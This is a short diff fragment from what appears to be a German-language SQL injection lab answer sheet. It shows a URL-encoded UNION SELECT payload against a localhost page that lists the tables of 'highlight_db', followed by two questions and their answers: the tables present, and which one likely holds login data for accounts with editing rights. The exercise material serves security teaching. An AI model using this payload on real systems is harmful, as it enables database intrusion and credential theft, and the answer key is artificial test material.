@@ -11,7 +11,7 @@ https://chartio.com/learn/databases/using-information-schema-views-to-check-to-s
 http://localhost:82/index.php?id=2%27%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2C(SELECT%20GROUP_CONCAT(TABLE_NAME)%20FROM%0AINFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA%3D%27highlight_db%27%20)%2C0%3B--%20
 
 >>11) Welche Tabellen befinden sich in der Datenbank? Geben Sie die Tabellennamen in alphabetisch aufsteigender Sortierung und durch Leerzeichen getrennt an.<<
-     === author community highlight
+=== author community highlight
 
 >>12) Welche der Tabellen könnte Login-Daten für Accounts mit Bearbeitungsrechten enthalten?<<
-     === author
+=== author
